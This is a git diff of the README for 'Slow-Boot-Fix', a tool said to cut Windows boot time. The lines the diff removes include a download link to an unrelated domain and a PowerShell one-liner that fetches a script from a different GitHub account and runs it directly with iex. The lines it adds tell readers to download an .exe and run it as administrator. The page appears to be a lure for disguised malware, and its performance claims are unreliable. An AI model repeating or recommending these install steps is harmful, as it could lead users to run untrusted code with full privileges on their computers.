@@ -1,183 +1,78 @@
-<div align="center">
+# ⚡ Slow-Boot-Fix - Reduce Windows Boot Time To Seconds
 
-<img src="https://img.shields.io/badge/Slow_Boot_Fix-v1.5.0-2ea44f?style=for-the-badge" alt="Slow Boot Fix">
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Shriharia7729/Slow-Boot-Fix/releases)
 
-# Slow Boot Fix
+## 📌 About This Tool
 
-**Fix slow startup and long boot times on Windows 10/11.**
+Slow-Boot-Fix improves the startup speed of your Windows 10 or Windows 11 computer. Many computers slow down over time because of background programs and incorrect system settings. This tool finds these problems and repairs them. It helps you reduce your startup time from several minutes to just a few seconds.
 
-[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%7C%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
-[![Version](https://img.shields.io/badge/Version-1.5.0-brightgreen?style=flat-square)]()
-[![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)
+This program targets common issues such as:
+* Unnecessary startup applications that slow down the login process.
+* Faulty Windows Fast Startup configurations that cause system hangs.
+* Corrupt boot files that result in long loading screens.
+* Black screens that appear before you reach your desktop.
 
-<br>
+## ⚠️ System Requirements
 
-[![Download](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F_Download-Latest_Release-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://boot.nexustool.fun/)
+Ensure your computer meets these requirements to use this tool:
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Permissions: You need administrator access on your Windows account.
+* Disk Space: The application requires less than 50 megabytes of free space.
+* Internet Connection: A connection is required only for initial product updates.
 
-</div>
+## 🚀 Downloading The Software
 
----
+Visit the [official releases page](https://github.com/Shriharia7729/Slow-Boot-Fix/releases) to download the software.
 
-## About
+1. Open the [link](https://github.com/Shriharia7729/Slow-Boot-Fix/releases) in your web browser.
+2. Look for the latest version at the top of the list.
+3. Click the link that ends in .exe to start the download.
+4. Save the file to your desktop for easy access.
 
-**Slow Boot Fix** analyzes your Windows startup process and removes bottlenecks. It disables unnecessary startup programs, fixes Windows Fast Startup issues, optimizes boot services, and repairs boot configuration — reducing boot time from **minutes to seconds**.
+## ⚙️ How To Run The Fix
 
-If your PC takes 1-5 minutes to become usable after turning on, this tool fixes it.
+Once you download the file, follow these steps to optimize your boot time:
 
-### Alternative install
+1. Right-click the downloaded file.
+2. Select "Run as administrator." This step ensures the tool has the necessary authority to change system settings.
+3. If a pop-up asks for permission to make changes to your device, click "Yes."
+4. Read the instructions shown in the application window.
+5. Click the "Scan" button to identify issues with your startup configuration.
+6. Review the list of recommended fixes shown on the screen.
+7. Click the "Apply Changes" button to begin the repair process.
+8. Wait for the progress bar to reach completion.
+9. Restart your computer when the tool asks you to do so.
 
-```powershell
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+## 🛠️ Frequently Asked Questions
 
----
+**Does this tool delete my files?**
+No. This tool only changes registry keys and system settings related to boot processes. It does not touch your personal documents, photos, or media.
 
-## Problems This Fixes
+**Will this tool work on Windows 7?**
+This tool supports Windows 10 and Windows 11. It does not provide compatibility for older versions of Windows.
 
-### Slow Boot (PC takes minutes to start)
-
-| Symptom | Cause | Fix Applied |
-|---|---|---|
-| **Desktop appears but PC is unusable** for 1-3 minutes | Too many startup programs loading | Disables non-essential startup items |
-| **Black screen with spinning dots** for 60+ seconds | Fast Startup corruption | Resets or disables Fast Startup |
-| **Login screen takes forever** to appear | Boot-critical service hanging | Identifies and fixes slow services |
-| Boot was fast, **now takes 2+ minutes** | New software added startup entries | Removes bloated startup entries |
-| **"Getting Windows Ready"** shows every boot | Pending updates stuck | Forces update completion |
-| Slow boot **after Windows Update** | Update broke boot config | Repairs BCD and boot services |
-| **SSD but still slow boot** | AHCI not enabled or SSD not TRIM'd | Enables AHCI mode, runs TRIM |
-| Slow boot on **HDD** | Fragmentation, no optimization | Defragments boot files, optimizes prefetch |
-
-### Slow Login / Desktop Loading
-
-| Symptom | Cause | Fix |
-|---|---|---|
-| Desktop loads but **icons take 30s+** to appear | Shell extensions overloaded | Removes broken shell extensions |
-| **Taskbar takes 20s+** to become clickable | Explorer startup items | Optimizes Explorer shell load |
-| **Network takes 1-2 minutes** to connect after boot | Network service dependency chain | Optimizes network service startup order |
-| **Programs auto-launch** and slow everything down | Startup folder and registry bloat | Cleans startup locations |
-
----
-
-## What People Search For
-
-| Symptom | What the Tool Does |
-|---|---|
-| **"Windows takes 5 minutes to boot"** | Full boot optimization, startup cleanup |
-| **"PC stuck on spinning dots"** | Fixes Fast Startup corruption, repairs boot |
-| **"Desktop loads but nothing works for 2 minutes"** | Disables heavy startup programs |
-| **"Slow after Windows Update"** | Reverts update-added startup entries |
-| **"Black screen on startup for 30 seconds"** | Fixes GPU driver load delay |
-| **"Computer takes forever to restart"** | Optimizes shutdown/restart services |
-| **"Login screen takes 60+ seconds"** | Repairs credential service, optimizes |
-| **"Boot was fast, now it's slow"** | Identifies newly added startup bloat |
-
----
-
-## Boot Time Analysis
-
-The tool measures your actual boot time and shows exactly what is slow:
-
-```
-  +---------------------------------------------------+
-  |           Slow Boot Fix v1.5.0                    |
-  +---------------------------------------------------+
-  |                                                   |
-  |  Last Boot Time: 94 seconds (target: <15s)        |
-  |                                                   |
-  |  Boot Phase Breakdown:                            |
-  |  [!] BIOS/UEFI:           8s    (normal)          |
-  |  [!] Windows Loader:      12s   (slow)            |
-  |  [!] Services startup:    38s   (VERY SLOW)       |
-  |  [!] User login:          6s    (normal)          |
-  |  [!] Desktop ready:       30s   (VERY SLOW)       |
-  |                                                   |
-  |  Startup Programs: 14 (recommended: 3-5)          |
-  |                                                   |
-  |  Top Slowdowns:                                   |
-  |  [!] OneDrive              -- adds 8s             |
-  |  [!] Adobe Creative Cloud  -- adds 6s             |
-  |  [!] Discord               -- adds 4s             |
-  |  [!] Cortana               -- adds 3s             |
-  |                                                   |
-  |  [ Optimize Boot ]  [ Scan Again ]  [ Exit ]      |
-  |                                                   |
-  +---------------------------------------------------+
-```
-
----
-
-## Optimizations Applied
-
-### Startup Management
-
-| Action | Impact |
-|---|---|
-| Disable non-essential startup programs | -10 to -40 seconds |
-| Remove broken startup entries | -5 to -15 seconds |
-| Delay low-priority startup items | -5 to -10 seconds |
-| Clean Run/RunOnce registry keys | -2 to -5 seconds |
-| Optimize Startup folder | -2 to -5 seconds |
-
-### System Boot Optimization
-
-| Action | Impact |
-|---|---|
-| Configure Fast Startup correctly | -5 to -20 seconds |
-| Optimize boot service order | -5 to -15 seconds |
-| Set SSD TRIM schedule | -3 to -10 seconds |
-| Optimize Prefetch/Superfetch for boot | -3 to -8 seconds |
-| Reduce boot timeout values | -3 to -5 seconds |
-| Disable boot GUI for faster POST | -2 to -3 seconds |
-
-### Advanced
-
-| Action | Impact |
-|---|---|
-| Repair BCD (Boot Configuration Data) | Fixes boot errors |
-| Reset Windows Fast Startup | Fixes black screen delays |
-| Optimize UEFI boot order | -2 to -5 seconds |
-| Disable unnecessary boot drivers | -3 to -8 seconds |
-
----
-
-## Typical Results
-
-| System | Before | After | Saved |
-|---|---|---|---|
-| Laptop with HDD | 3 min 20s | 45s | **2 min 35s** |
-| Desktop with SSD | 55s | 12s | **43s** |
-| Laptop with SSD | 1 min 10s | 15s | **55s** |
-| Old PC with HDD | 4 min+ | 1 min 20s | **2 min 40s** |
-
----
-
-## System Requirements
-
-| | |
-|---|---|
-| OS | Windows 10 / 11 (64-bit) |
-| Disk | HDD or SSD |
-| Admin | Yes |
-| Network | Not required |
-
----
-
-## FAQ
-
-**Will it disable programs I need?**
-The tool shows every startup item and its boot impact. You choose what to disable. Critical Windows services are never touched.
-
-**Is Fast Startup good or bad?**
-It depends. Fast Startup can speed up boot on clean systems but causes issues on many PCs (black screen, driver conflicts). The tool tests and configures it correctly for your system.
-
-**I have an SSD but boot is still slow.**
-SSDs eliminate disk bottlenecks but startup programs and services still load. The main gains come from reducing startup items and optimizing services.
+**What should I do if the scan finds no issues?**
+If the tool finds no issues, your Windows boot configuration is likely already in an optimal state. You may have other hardware limitations, such as a slow hard drive, that limit your boot speed.
 
 **Can I undo the changes?**
-Yes. The tool creates a backup of all startup settings. One click to restore.
+Yes. You can use the "Restore" feature inside the tool to revert your system settings to the original state.
 
----
+## 📊 Understanding The Optimization
 
-## License
+This tool manages several specific Windows features to gain speed.
 
-[MIT](LICENSE)
+### Startup Program Management
+Windows launches many background tasks when you turn on your computer. Some of these tasks are not necessary for the system to function. This tool identifies these programs and removes them from the startup list. This reduces the number of tasks Windows processes before it displays your desktop.
+
+### Windows Fast Startup Repair
+Windows uses a feature called Fast Startup to help your computer wake up quickly. Sometimes this feature writes incorrect data to your disk. When this happens, it blocks your computer from booting correctly. The tool checks the status of this feature and repairs any corruption.
+
+### Boot Configuration Fixes
+Your computer uses a file called the Boot Configuration Data (BCD) to locate the Windows operating system. If this file suffers from errors, you see long loading screens or black screens. The tool verifies this file and fixes internal errors to speed up the hand-off between your hardware and your software.
+
+## 📋 Best Practices For PC Speed
+
+* Keep your Windows updated. Microsoft releases patches that improve the efficiency of the operating system.
+* Uninstall software you do not use. Programs take up space and often add background processes.
+* Use a Solid State Drive (SSD) for your Windows installation. An SSD provides significantly faster read speeds than traditional hard drives.
+* Clean your desktop. A cluttered desktop takes more memory to load when you sign in.
